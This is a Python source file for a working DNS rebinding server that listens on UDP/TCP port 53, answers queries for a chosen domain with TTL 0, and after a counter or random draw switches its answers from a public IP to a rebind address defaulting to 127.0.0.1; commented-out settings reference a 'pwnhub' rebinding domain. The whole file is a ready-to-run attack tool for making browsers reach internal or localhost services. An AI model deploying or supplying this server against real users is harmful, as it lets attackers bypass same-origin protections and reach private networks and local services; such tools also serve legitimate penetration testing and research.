#!/usr/bin/env python
# coding=utf-8

import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
import datetime
import random
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)


class Colors:
    """ ANSI color codes """
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    # cancel SGR codes if we don't write to a terminal
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        # set Windows console in VT mode
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32


def time_fmt():
    current_time = datetime.datetime.now()
    return current_time.strftime("%H:%M:%S.%f")[:-3]


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


# D = DomainName('ox-rebind.pwnhub.eu.')
# IP = '138.201.152.197'
# TTL = 0

# soa_record = SOA(
#     mname=D.ns1,  # primary name server
#     rname=D.andrei,  # email of the domain administrator
#     times=(
#         201307231,  # serial number
#         60 * 60 * 1,  # refresh
#         60 * 60 * 3,  # retry
#         60 * 60 * 24,  # expire
#         60 * 60 * 1,  # minimum
#     )
# )
# ns_records = [NS(D.ns1), NS(D.ns2)]
# records = {
#     D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
#     D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
#     D.ns2: [A(IP)],
#     D.mail: [A(IP)],
#     D.andrei: [CNAME(D)],
# }

def should_rebind(source_ip, hits, hits_max):
    p = hits_max / 10.0
    r = random.random()

    if r < p:
        return True
    else:
        return False
    #if hits < hits_max:
    #    return True
    #else:
    #    return False
    #if (hits % 2) == 1:
    #    return True
    #else:
    #    return False


last_time = None
def dns_response(data, domain, ip, rebind, ttl, counterMax, hostCounter, client_ip):
    request = DNSRecord.parse(data)
    global last_time

    # print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    if qn == domain or qn.endswith('.' + domain):

        now = datetime.datetime.now()

        if last_time != None and (now - last_time).total_seconds() > 3:
            print('')

        last_time = now


        #print(request)
        rqt = "A"
        ctime = time_fmt()
        if qt in ['*', rqt]:
            #print("request for " + str(qname) + " Type: " + str(qt))
            if qn in hostCounter:
                if should_rebind(client_ip, hostCounter[qn], counterMax):
                    reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=ttl, rdata=A(ip)))
                    print(f'[{ctime}] {Colors.GREEN}{A(ip)}{Colors.END} => {client_ip}')
                else:
                    reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=ttl, rdata=A(rebind)))
                    print(f'[{ctime}] {Colors.RED}{A(rebind)}{Colors.END} => {client_ip}')

                hostCounter[qn] = hostCounter[qn] + 1
            else:
                reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=ttl, rdata=A(ip)))
                hostCounter[qn] = 1

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        #print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
        #                                       self.client_address[1]))
        try:
            data = self.get_data()
        #   print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data, self.server.domain, self.server.ip, self.server.rebind, self.server.ttl, self.server.counterMax, self.server.hostCounter, self.client_address[0]))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        #print(f'> {self.client_address[0]}')
        data = self.request.recv(8192)
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        #print(f'{Colors.CYAN}> {self.client_address[0]}{Colors.END}')
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python.')
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python. Usually DNSs use UDP on port 53.')
    parser.add_argument('--port', default=53, type=int, help='The port to listen on.')
    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
    parser.add_argument('--domain', default=None, type=str, help='The domain to listen for', required=True)
    parser.add_argument('--ttl', default=0, type=int, help='TTL value of DNS responses')
    parser.add_argument('--bind', default='', type=str, help='IP Adress for server to listen on')
    parser.add_argument('--ip', default='8.8.8.8', help='IP Adress used to respond')
    parser.add_argument('--rebind', default='127.0.0.1', help='IP address for rebind')
    parser.add_argument('--counter', default=2, type=int, help='Number of requests before rebinding'),

    args = parser.parse_args()
    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")

    #print("Starting nameserver...")

    servers = []
    if args.udp: servers.append(socketserver.ThreadingUDPServer((args.bind, args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer((args.bind, args.port), TCPRequestHandler))

    for s in servers:
        domain = args.domain if args.domain.endswith(".") else args.domain + "."
        s.domain = DomainName(domain) # ox-rebind.pwnhub.eu.
        s.ip = args.ip
        s.rebind = args.rebind
        s.ttl = args.ttl
        s.counterMax = args.counter
        s.hostCounter = {}
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        #print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()
